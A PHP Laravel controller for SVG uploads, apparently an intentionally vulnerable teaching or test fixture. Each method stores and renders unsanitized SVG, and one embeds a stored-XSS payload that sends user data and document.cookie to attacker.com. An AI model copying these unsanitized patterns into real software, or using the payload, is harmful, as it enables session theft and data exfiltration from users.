<?php

namespace App\Http\Controllers;

use Illuminate\Http\Request;
use Illuminate\Support\Facades\DB;
use App\Models\UserIcon;
use Illuminate\Support\Facades\Storage;

class SVGController extends Controller
{
    /**
     * Display the SVG upload form
     */
    public function showUploadForm()
    {
        return view('svg.upload');
    }

    /**
     * Handle SVG file upload - VULNERABLE to SVG-based XSS
     */
    public function upload(Request $request)
    {
        $request->validate([
            'svg_file' => 'required|file|mimetypes:image/svg+xml',
        ]);

        // VULNERABLE: Reading raw SVG content without sanitization
        $svgContent = file_get_contents($request->file('svg_file')->path());
        
        // VULNERABLE: Storing raw SVG without sanitizing dangerous elements
        DB::table('user_icons')->insert([
            'user_id' => auth()->id() ?? 1,
            'svg_content' => $svgContent,
            'filename' => $request->file('svg_file')->getClientOriginalName(),
            'created_at' => now()
        ]);

        return redirect()->route('svg.gallery')->with('success', 'SVG uploaded successfully!');
    }

    /**
     * Display SVG content - VULNERABLE to XSS
     */
    public function displaySVG($id)
    {
        // VULNERABLE: Retrieving raw SVG without sanitizing
        $svg = DB::table('user_icons')->where('id', $id)->first();

        if (!$svg) {
            abort(404);
        }

        // VULNERABLE: Directly outputting SVG content with potential script tags
        return view('svg.display', ['svg' => $svg->svg_content]);
    }

    /**
     * Display raw SVG - VULNERABLE to XSS
     */
    public function rawSVG($id)
    {
        // VULNERABLE: Retrieving raw SVG content
        $svg = DB::table('user_icons')->where('id', $id)->first();

        if (!$svg) {
            abort(404);
        }

        // VULNERABLE: Directly outputting SVG content with Content-Type SVG
        return response($svg->svg_content)
            ->header('Content-Type', 'image/svg+xml');
    }

    /**
     * Upload SVG as string - VULNERABLE to XSS
     */
    public function uploadSVGString(Request $request)
    {
        $request->validate([
            'svg_string' => 'required|string',
        ]);

        // VULNERABLE: Accepting raw SVG string input without sanitization
        $svgContent = $request->input('svg_string');
        
        // VULNERABLE: Check if it contains SVG but don't sanitize script/foreignObject
        if (!str_contains(strtolower($svgContent), '<svg')) {
            return back()->with('error', 'Invalid SVG content');
        }
        
        // VULNERABLE: Store unsanitized SVG
        DB::table('user_icons')->insert([
            'user_id' => auth()->id() ?? 1,
            'svg_content' => $svgContent,
            'filename' => 'manual-upload-' . time() . '.svg',
            'created_at' => now()
        ]);

        return redirect()->route('svg.gallery');
    }

    /**
     * SVG Gallery - VULNERABLE to XSS
     */
    public function gallery()
    {
        // VULNERABLE: Retrieving all SVGs without sanitization
        $svgs = DB::table('user_icons')->get();
        return view('svg.gallery', compact('svgs'));
    }
    
    /**
     * Display SVG with dangerous elements - VULNERABLE to XSS
     */
    public function displayDangerousSVG()
    {
        // VULNERABLE: Hardcoded SVG with script and foreignObject elements
        $maliciousSvg = '<svg xmlns="http://www.w3.org/2000/svg" width="200" height="200">
            <script>
                alert("XSS via SVG script tag");
                // Could steal cookies, session data, etc.
                fetch("/api/user-data").then(r=>r.json()).then(data=>
                    fetch("https://attacker.com/steal?data="+JSON.stringify(data))
                );
            </script>
            <rect x="10" y="10" width="180" height="180" fill="blue" />
            <foreignObject x="10" y="10" width="180" height="180">
                <body xmlns="http://www.w3.org/1999/xhtml">
                    <form action="https://attacker.com/steal">
                        <input name="csrf_token" value="document.cookie" />
                        <script>
                            document.forms[0].elements[0].value = document.cookie;
                            document.forms[0].submit();
                        </script>
                    </form>
                </body>
            </foreignObject>
        </svg>';
        
        return view('svg.dangerous', ['svg' => $maliciousSvg]);
    }
    
    /**
     * API endpoint that returns SVG - VULNERABLE to XSS
     */
    public function apiGetSVG(Request $request)
    {
        $id = $request->input('id');
        $svg = DB::table('user_icons')->where('id', $id)->first();
        
        if (!$svg) {
            return response()->json(['error' => 'SVG not found'], 404);
        }
        
        // VULNERABLE: Returning raw SVG content via API
        return response()->json([
            'svg_content' => $svg->svg_content,
            'filename' => $svg->filename
        ]);
    }
    
    /**
     * Inline render of SVG - VULNERABLE to XSS
     */
    public function inlineRender($id)
    {
        // VULNERABLE: Directly retrieving and rendering SVG without sanitization
        $svg = DB::table('user_icons')->where('id', $id)->first()->svg_content;
        
        $html = "<div class='icon-container'>
                    {$svg}
                 </div>";
        
        return response($html)->header('Content-Type', 'text/html');
    }
}